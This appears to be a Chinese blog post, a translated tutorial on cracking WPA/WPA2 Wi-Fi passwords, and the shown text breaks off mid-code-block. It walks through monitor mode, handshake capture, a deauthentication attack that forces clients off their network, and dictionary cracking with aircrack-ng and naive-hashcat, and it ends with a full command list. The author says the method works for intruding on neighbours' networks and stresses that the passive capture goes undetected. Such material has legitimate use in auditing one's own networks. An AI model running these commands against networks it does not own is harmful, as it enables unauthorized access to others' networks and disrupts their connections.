{"title":"Wi-Fi 等无线网络安全审计方法","date":"2020-01-24T09:49:59.000Z","date_formatted":{"ll":"2020年1月24日","L":"2020/01/24","MM-DD":"01-24"},"thumbnail":"https://cdn.jsdelivr.net/gh/gaowanliang/p/img/75057185_p0.jpg","link":"2020/01/24/wifi-cracking","comments":true,"tags":["网络安全"],"updated":"2020-01-27T06:38:55.422Z","content":"<h1 id=\"wi-fi-破解\">Wi-Fi 破解<a href=\"#wi-fi-破解\" title=\"Wi-Fi 破解\"></a></h1><p>利用 Airodump-ng 以及 <a href=\"http://aircrack-ng.org/\" target=\"_blank\">Aircrack-ng</a> / <a href=\"http://hashcat.net/\" target=\"_blank\">Hashcat</a> 破解 WPA/WPA2 WI-FI 路由器。</p>\n<p>这是个简洁的教程，一步一步的描述了如何破解使用弱密码保护的 WI-FI 网络。它不会极尽其详，但是足够你用来测试自己的网络安全或者入侵附近网络。下面列出的攻击完全是被动式的（仅仅监听，不会广播你电脑上的任何东西），并且对于你破解的但是却未真正使用的密码是无法监测到的。不过一个可选的 deauthentication 攻击可以用于加速侦查过程，在<a href=\"#deauth-attack\">文档末尾</a>有描述。</p>\n<p>如果你熟悉这个过程，你可以跳过这段描述直接跳到<a href=\"#命令列表\">底部</a>使用的命令列表。更多种建议以及可行的方法，参考<a href=\"#附录A\">附录A</a>。</p>\n<p><strong>声明：这个软件/教程仅仅用于教学。不应该使用它从事任何非法活动。作者不会对它的使用负责。不要犯傻。</strong></p>\n<h2 id=\"入门\">入门<a href=\"#入门\" title=\"入门\"></a></h2><p>这个教程假定你：</p>\n<ul><li>可以流畅使用命令行</li>\n<li>使用一个基于debian的linux发行版本，最好是 <a href=\"https://www.kali.org/\" target=\"_blank\">Kali linux</a></li>\n<li>安装 <a href=\"http://aircrack-ng.org/\" target=\"_blank\">Aircrack-ng</a><ul><li><code>sudo apt-get install aircrack-ng</code></li>\n</ul></li>\n<li>拥有一块支持<a href=\"https://en.wikipedia.org/wiki/Monitor_mode\" target=\"_blank\">监测模式</a>的无线网卡（对于支持的设备列表，参考<a href=\"http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html\" target=\"_blank\">这里</a>)</li>\n</ul><h2 id=\"破解一个wi-fi网络\">破解一个WI-FI网络<a href=\"#破解一个wi-fi网络\" title=\"破解一个WI-FI网络\"></a></h2><h3 id=\"监测模式-monitor-mode\">监测模式 (Monitor Mode)<a href=\"#监测模式-monitor-mode\" title=\"监测模式 (Monitor Mode)\"></a></h3><p>让我们通过下面的命令可以列出支持监测模式的无线接口开始：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">airmon-ng</span><br></pre></td></tr></table></figure>\n\n<p>如果你没有看到有接口列出，意味着你的无线网卡就不支持监测模式 😞</p>\n<p>我们将假设你的无线接口名称是 <code>wlan0</code>，但是请确保使用正确的名称如果你的名称与这个不同的话。接下来，我们将接口转换为监测模式：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>\n\n<p>运行 <code>iwconfig</code>。你现在应该能够看到列出一个新的监测模式接口（比如 <code>mon0</code> 或者 <code>wlan0mon</code>）。</p>\n<h3 id=\"找到你的目标\">找到你的目标<a href=\"#找到你的目标\" title=\"找到你的目标\"></a></h3><p>使用你的监测接口开始监听附近的 <a href=\"https://en.wikipedia.org/wiki/Beacon_frame\" target=\"_blank\">802.11 Beacon 帧</a>广播：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">airodump-ng mon0</span><br></pre></td></tr></table></figure>\n\n<p>你应该可以看到类似于下面的输出。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                         </span><br><span class=\"line\">                                                                                                                                              </span><br><span class=\"line\"> BSSID              PWR  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class=\"line\">                                                                                                                                              </span><br><span class=\"line\"> 14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests                                                   </span><br><span class=\"line\"> 14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8                                                          </span><br><span class=\"line\"> 14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        &lt;length:  0&gt;                                                        </span><br><span class=\"line\"> 14:22:DB:1A:DB:66  -83       48        0    0   1  54e. WPA2 CCMP   PSK  steveserro                                                          </span><br><span class=\"line\"> 9C:5C:8E:C9:AB:C0  -81       19        0    0   3  54e  WPA2 CCMP   PSK  hackme                                                                 </span><br><span class=\"line\"> 00:23:69:AD:AF:94  -82      350        4    0   1  54e  WPA2 CCMP   PSK  Kaitlin&#39;s Awesome                                                   </span><br><span class=\"line\"> 06:26:BB:75:ED:69  -84      232        0    0   1  54e. WPA2 CCMP   PSK  HH2                                                                 </span><br><span class=\"line\"> 78:71:9C:99:67:D0  -82      339        0    0   1  54e. WPA2 CCMP   PSK  ARRIS-67D2                                                          </span><br><span class=\"line\"> 9C:34:26:9F:2E:E8  -85       40        0    0   1  54e. WPA2 CCMP   PSK  Comcast_2EEA-EXT                                                    </span><br><span class=\"line\"> BC:EE:7B:8F:48:28  -85      119       10    0   1  54e  WPA2 CCMP   PSK  root                                                                </span><br><span class=\"line\"> EC:1A:59:36:AD:CA  -86      210       28    0   1  54e  WPA2 CCMP   PSK  belkin.dca</span><br></pre></td></tr></table></figure>\n\n<p>出于这个演示的目的，我们将会破解我自己的网络，&quot;hackme&quot;。记住利用 <code>airodump-ng</code> 展示的 BSSID， MAC 地址以及信道（<code>CH</code>）号，在下一个步骤中我们将会需要它们。</p>\n<h3 id=\"捕获-4-way-handshake\">捕获 4-way Handshake<a href=\"#捕获-4-way-handshake\" title=\"捕获 4-way Handshake\"></a></h3><p>WPA/WPA2 使用 <a href=\"https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk\" target=\"_blank\">4-way Handshake</a> 来认证设备连接网络。你不需要明白这些的含意，但是你必须抓取 handshake 才能破解网络密码。这些握手发生在设备连接网络的时候，比如，当你的邻居工作回家的时候。我们通过之前命令发现的信道以及 bssid 值来使用 <code>airmon-ng</code> 来监视目标网络。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 将 -c 以及 --bssid 值替换为你的目标网络值</span></span><br><span class=\"line\"><span class=\"comment\"># -w 用来指定我们保存捕获到数据包的文件夹</span></span><br><span class=\"line\">airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        </span><br><span class=\"line\">                                                                                                                                             </span><br><span class=\"line\">BSSID              PWR RXQ  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class=\"line\">                                                                                                                                             </span><br><span class=\"line\">9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS</span><br></pre></td></tr></table></figure>\n\n<p>现在让我们等一会儿... 当我们捕捉到一个握手时，你应该能够马上在屏幕的右上角看到类似于<code>[ WPA handshake: bc:d3:c9:ef:d2:67</code>的一些东西。</p>\n<p>如果你不想等，也不反感进行一次主动攻击，你可以强制设备连接到目标网络来重新连接，并且在目标网络中发送恶意 deauthentication 数据包。通常这样就可以抓到  4-way handshake 了。参考下面的 <a href=\"#deauth-attack\">deauth 攻击章节</a> 来获取关于此的信息。</p>\n<p>一旦你捕获了一个握手，按下 <code>ctrl-c</code> 来终止 <code>airodump-ng</code>。这是在你指定的 <code>airodump-ng</code> 输出目录下，应该看到一个用来保存捕获信息的<code>.cap</code>文件（比如叫做<code>-01.cap</code>）。我们将会使用这个捕获文件来破解网络密码。个人喜欢将这个文件重命名为当前正在尝试破解的网络名称：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mv ./-01.cap hackme.cap</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"破解网络密码\">破解网络密码<a href=\"#破解网络密码\" title=\"破解网络密码\"></a></h3><p>最后一个步骤是使用捕获的 handshake 数据来破解密码。如果你能够访问 GPU，我<strong>强烈</strong>建议你使用 <code>hashcat</code> 来破解密码。我已经创建了一个叫做 <a href=\"https://github.com/brannondorsey/naive-hashcat\" target=\"_blank\"><code>naive-hashcat</code></a> 的简单工具可以让使用 hashcat 变得非常方便。如果你不能够访问 GPU，还有很多在线的 GPU 破解服务可以使用，比如 <a href=\"https://gpuhash.me/\" target=\"_blank\">GPUHASH.me</a> 或者 <a href=\"https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php\" target=\"_blank\">OnlineHashCrack</a> 。你也可以常使用 Aircrack-ng 来进行 CPU 破解。</p>\n<p>注意下面的攻击方法都假设用户正在使用弱密码。现如今很多 WPA/WPA2 路由自带 12 位强随机密码，大部分用户都不会去更改。如果你去尝试破解这些密码，我建议你使用 <a href=\"https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length\" target=\"_blank\">Probable-Wordlists WPA-length</a> 字典文件。</p>\n<h4 id=\"使用-naive-hashcat-破解（推荐）\">使用 <code>naive-hashcat</code> 破解（推荐）<a href=\"#使用-naive-hashcat-破解（推荐）\" title=\"使用 naive-hashcat 破解（推荐）\"></a></h4><p>在我们使用 naive-hashcat 破解密码之前，我们需要将我们的 <code>.cap</code> 文件转换成同等 hashcat 文件格式 <code>.hccapx</code>。你可以通过上传 <code>.cap</code> 文件到 <a href=\"https://hashcat.net/cap2hccapx/\" target=\"_blank\">https://hashcat.net/cap2hccapx/</a>  或者直接使用 <a href=\"https://github.com/hashcat/hashcat-utils\" target=\"_blank\"><code>cap2hccapx</code></a> 工具。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cap2hccapx.bin hackme.cap hackme.hccapx</span><br></pre></td></tr></table></figure>\n\n<p>接着，下载并运行 <code>naive-hashcat</code>：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/brannondorsey/naive-hashcat</span><br><span class=\"line\"><span class=\"built_in\">cd</span> naive-hashcat</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 下载 134MB rockyou 字典文件</span></span><br><span class=\"line\">curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 破解！宝贝！破解！</span></span><br><span class=\"line\"><span class=\"comment\"># 2500 是 hashcat 对于 WPA/WPA2 的哈希模式</span></span><br><span class=\"line\">HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh</span><br></pre></td></tr></table></figure>\n\n<p>Naive-hashcat 使用多种<a href=\"https://hashcat.net/wiki/doku.php?id=dictionary_attack\" target=\"_blank\">字典</a>，<a href=\"https://hashcat.net/wiki/doku.php?id=rule_based_attack\" target=\"_blank\">规则</a>，<a href=\"https://hashcat.net/wiki/doku.php?id=combinator_attack\" target=\"_blank\">组合</a>以及<a href=\"https://hashcat.net/wiki/doku.php?id=mask_attack\" target=\"_blank\">伪装</a>（聪明的暴力）攻击，并且它需要花费数天甚至数月来破解中等长度的密码。破解的密码将会保存到hackme.pot，因此不时要检查这个文件。一旦你破解这个密码，你将会在你的 <code>POI_FILE</code> 看到类似于下面的内容：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet</span><br></pre></td></tr></table></figure>\n\n<p>最后两块被 <code>:</code> 分隔开来，分别是网络名称和密码。</p>\n<p>如果你想直接使用 <code>hashcat</code> 而不是 <code>naive-hashcat</code> 的话请参考<a href=\"https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2\" target=\"_blank\">这个页面</a>。</p>\n<h4 id=\"利用-aircrack-ng-破解\">利用 Aircrack-ng 破解<a href=\"#利用-aircrack-ng-破解\" title=\"利用 Aircrack-ng 破解\"></a></h4><p>Aircrack-ng 可以用于在你的 CPU 上运行来进行非常基本的字典攻击。在你运行攻击之前，你需要一个单词表。我推荐使用非常著名的 rockyou 字典文件：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载 134MB rockyou 字典文件</span></span><br><span class=\"line\">curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p>注意，如果网络密码不再这个单词文件话，你将不能破解密码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -a2 指定 WPA2，-b 是 BSSID，-w 是字典文件</span></span><br><span class=\"line\">aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap</span><br></pre></td></tr></table></figure>\n\n<p>如果密码被破解了，你将会在终端看到一个 <code>KEY FOUND!</code> 消息，后面跟着的文本就是网络密码。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                           Aircrack-ng 1.2 beta3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">             [00:01:49] 111040 keys tested (1017.96 k&#x2F;s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">                   KEY FOUND! [ hacktheplanet ]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 </span><br><span class=\"line\">                 59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E </span><br><span class=\"line\"></span><br><span class=\"line\">Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 </span><br><span class=\"line\">                 2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 </span><br><span class=\"line\">                 6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 </span><br><span class=\"line\">                 8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 </span><br><span class=\"line\"></span><br><span class=\"line\">EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"deauth-attack\">Deauth Attack<a href=\"#deauth-attack\" title=\"Deauth Attack\"></a></h2><p>Deauth 攻击会将伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端。 这些数据包包括伪造的 “发件人” 地址，使得它们像客户端那样从接入点本身发送出去。 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接，如果您正在使用<code>airodump-ng</code>进行侦听，就能捕获到 4-way handshake。</p>\n<p>使用 <code>airodump-ng</code> 监视特定接入点（使用 <code>-c channel --bssid MAC</code>），直到看到客户端（<code>STATION</code>）连接。 连接的客户端看起来像这样，<code>64：BC：0C：48：97：F7</code> 是客户端 MAC。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         </span><br><span class=\"line\">                                                                                                                                          </span><br><span class=\"line\">BSSID              PWR RXQ  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class=\"line\">                                                                                                                                          </span><br><span class=\"line\">9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         </span><br><span class=\"line\">                                                                                                                                          </span><br><span class=\"line\">BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 </span><br><span class=\"line\">                                                                                                                                          </span><br><span class=\"line\">9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS</span><br></pre></td></tr></table></figure>\n\n<p>现在，先不管这个正在运行的 <code>airodump-ng</code> ，打开一个新的终端。 我们用 <code>aireplay-ng</code> 命令向我们的受害者客户端发送伪造的解除认证数据包，强制其重新连接到网络，以便在此过程中抓取 handshake。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -0 2 指定了我们将发送 2 个解除认证的数据包。如果需要</span></span><br><span class=\"line\"><span class=\"comment\"># 可以增加这个数字，但随之而来客户端网络可能中断，有被人注意到的风险。</span></span><br><span class=\"line\"><span class=\"comment\"># -a 是接入点的 MAC</span></span><br><span class=\"line\"><span class=\"comment\"># -c 是客户端的 MAC</span></span><br><span class=\"line\">aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0</span><br></pre></td></tr></table></figure>\n\n<p>你也可以选择得通过广播解除认证数据包到所有连接的客户端：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 尽管不是所有的客户端都会响应广播解除认证</span></span><br><span class=\"line\">aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0</span><br></pre></td></tr></table></figure>\n\n<p>发送了解除认证数据包后，回到你的 <code>airodump-ng</code> 进程，运气好的话你现在应该看到右上角：<code>[WPA握手：9C：5C：8E：C9：AB：C0</code>。 现在你已经捕获了握手，你应该准备好<a href=\"#crack-the-network-password\">破解网络密码</a>。</p>\n<h2 id=\"命令列表\">命令列表<a href=\"#命令列表\" title=\"命令列表\"></a></h2><p>下面列出了破解WPA/WPA2网络所需的所有命令，以最少的解释为依据。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 将你的设备设置成监测模式</span></span><br><span class=\"line\">airmon-ng start wlan0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 监听附近所有的 beacon 帧来获取目标 BSSID 以及信道</span></span><br><span class=\"line\">airodump-ng mon0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 开始监听握手</span></span><br><span class=\"line\">airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 选择性的对于连接的设备进行解除验证从而强制握手</span></span><br><span class=\"line\">aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">########## 利用 aircrack-ng 破解密码... ##########</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果需要的话下载 134MB 的 rockyou.txt 字典文件</span></span><br><span class=\"line\">curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 利用 w/ aircrack-ng 破解</span></span><br><span class=\"line\">aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">########## 或者利用 naive-hashcat 破解密码 ##########</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 cap 转换成 hccapx</span></span><br><span class=\"line\">cap2hccapx.bin capture/-01.cap capture/-01.hccapx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 利用 naive-hashcat 破解</span></span><br><span class=\"line\">HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录\">附录<a href=\"#附录\" title=\"附录\"></a></h2><p>非常欢迎对这篇教程进行回复，我已经添加了社区成员的建议和附加资料作为<a href=\"#appendix.zh.md\">附录</a>。它包括：</p>\n<ul><li>在 MacOS/OSX 上捕获握手并且破解WPA密码</li>\n<li>利用 <code>wlandump-ng</code> 捕获从你周围每个网络捕获握手</li>\n<li>使用 <code>crunch</code> 即时生成 100+GB 的单词列表</li>\n<li>利用 <code>macchanger</code> 伪造你的 MAC 地址</li>\n</ul><p>现在也提供<a href=\"appendix.zh.md\">中文版本</a>附录。</p>\n<h2 id=\"致谢\">致谢<a href=\"#致谢\" title=\"致谢\"></a></h2><p>这里提供的大部分信息都是从 <a href=\"https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html\" target=\"_blank\">Lewis Encarnacion 的绝妙的教程</a> 中收集的。 感谢在 Aircrack-ng 和 Hashcat 上工作的优秀作者和维护者。</p>\n<p>非常感谢 <a href=\"https://github.com/neal1991\" target=\"_blank\">neal1991</a> 将本教程翻译成<a href=\"README.zh.md\">中文</a>。另外也感谢 <a href=\"https://github.com/hiteshnayak305\" target=\"_blank\">hiteshnayak305</a>，<a href=\"https://github.com/enilfodne\" target=\"_blank\">enilfodne</a>， <a href=\"https://www.reddit.com/user/DrinkMoreCodeMore\" target=\"_blank\">DrinkMoreCodeMore</a>，<a href=\"https://www.reddit.com/user/hivie7510\" target=\"_blank\">hivie7510</a>，<a href=\"https://github.com/cprogrammer1994\" target=\"_blank\">cprogrammer1994</a>，<a href=\"https://github.com/0XE4\" target=\"_blank\">0XE4</a>，<a href=\"https://github.com/hartzell\" target=\"_blank\">hartzell</a>，<a href=\"https://github.com/zeeshanu\" target=\"_blank\">zeeshanu</a>，<a href=\"https://github.com/flennic\" target=\"_blank\">flennic</a>，<a href=\"https://github.com/bhusang\" target=\"_blank\">bhusang</a>，<a href=\"https://github.com/tversteeg\" target=\"_blank\">tversteeg</a>，<a href=\"https://github.com/gpetrousov\" target=\"_blank\">gpetrousov</a>，<a href=\"https://github.com/crowchirp\" target=\"_blank\">crowchirp</a> 和 <a href=\"https://github.com/shark0der\" target=\"_blank\">Shark0der</a>，他们也在 <a href=\"https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/\" target=\"_blank\">Reddit</a> 和 GitHub 上提供建议或帮助完善这篇文章。如果您有兴趣听取 WPA2 的一些建议替代方案，请参考 <a href=\"https://news.ycombinator.com/item?id=14840539\" target=\"_blank\">Hacker News</a> 的一些重要讨论。</p>\n<h1 id=\"附录a\">附录A<a href=\"#附录a\" title=\"附录A\"></a></h1><p>在本教程初次发布之后，来自互联网各个角落的一些人提出了意见和建议。 在努力保持原始教程简短而优美的基础上，我在这里介绍了有关他们精彩建议的信息，并添加了我自己的一些。 在这里，你可以找到以下信息：</p>\n<ul><li>在 MacOS/OSX 上破解 WI-FI</li>\n<li>利用 <code>wlandump-ng</code> 抓取 handshake </li>\n<li>利用 <code>crunch</code> 生成单词列表</li>\n<li>利用 <code>macchanger</code> 保护你的身份</li>\n</ul><h2 id=\"在-macososx-上破解-wi-fi\">在 MacOS/OSX 上破解 WI-FI<a href=\"#在-macososx-上破解-wi-fi\" title=\"在 MacOS/OSX 上破解 WI-FI\"></a></h2><p>非常感谢 <a href=\"https://github.com/harshpatel991\" target=\"_blank\">@harshpatel991</a> 提供本指南。下面会介绍如何使用 MacOS/OSX 自带的工具抓取 4-way handshake，然后再通过 naive-hashcat 来找出一个 WPA/WPA2 无线网络的密码。 此方法已在 OSX 10.10 和 10.12 上进行测试，不过也可能适用于其他版本。 像主教程一样，我们假设你有一个支持 <a href=\"https://en.wikipedia.org/wiki/Monitor_mode\" target=\"_blank\">监测模式</a> 的<a href=\"http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html\" target=\"_blank\">无线网卡</a>。我们在 2012 年上半年和 2015 年中期这两款 MacBook Pro 上进行了测试，并取得了巨大的成功。</p>\n<h3 id=\"无线诊断工具\">无线诊断工具<a href=\"#无线诊断工具\" title=\"无线诊断工具\"></a></h3><p>幸运的是，OSX 配备了一套无线诊断工具。 要打开它们，请在按住键盘上 option 键的同时，点击菜单栏中的 Wi-Fi 图标。 然后选择“打开无线诊断...”</p>\n<h3 id=\"测定目标网络信道\">测定目标网络信道<a href=\"#测定目标网络信道\" title=\"测定目标网络信道\"></a></h3><p>打开无线诊断程序，单击<strong>窗口</strong> &gt; <strong>扫描</strong>。 找到目标网络，记录下其信道和宽度。</p>\n<h3 id=\"抓取一个-4-way-handshake\">抓取一个 4-way handshake<a href=\"#抓取一个-4-way-handshake\" title=\"抓取一个 4-way handshake\"></a></h3><ol><li>在无线诊断程序打开的情况下，点击菜单栏中的<strong>窗口</strong> &gt; <strong>嗅探器</strong>。选择你在上一步中找到的信道和宽度。</li>\n<li>现在，你需要等待有设备连接到目标网络。如果你正在自己的网络上测试（使用者应当只在自己的网络上进行测试），将任意一个无线设备重新连接就可以抓取 handshake。</li>\n<li>当你感觉已经成功抓取 handshake 时，点击停止。</li>\n<li>根据你的操作系统版本，抓取的 <code>.wcap</code> 文件将被保存到桌面或<code>/var/tmp/</code>。</li>\n<li>将抓取的文件上传到 <a href=\"https://hashcat.net/cap2hccapx/\" target=\"_blank\">https://hashcat.net/cap2hccapx/</a> 就可以将其转换为 <code>.hccapx</code> 文件。 如果你成功的抓到了 handshake ，站点将开始下载一个<code>.hccapx</code>文件。 否则将不会提示下载。</li>\n</ol><h3 id=\"利用-naive-hashcat-破解密码\">利用 <code>naive-hashcat</code> 破解密码<a href=\"#利用-naive-hashcat-破解密码\" title=\"利用 naive-hashcat 破解密码\"></a></h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆 naive-hashcat</span></span><br><span class=\"line\">git <span 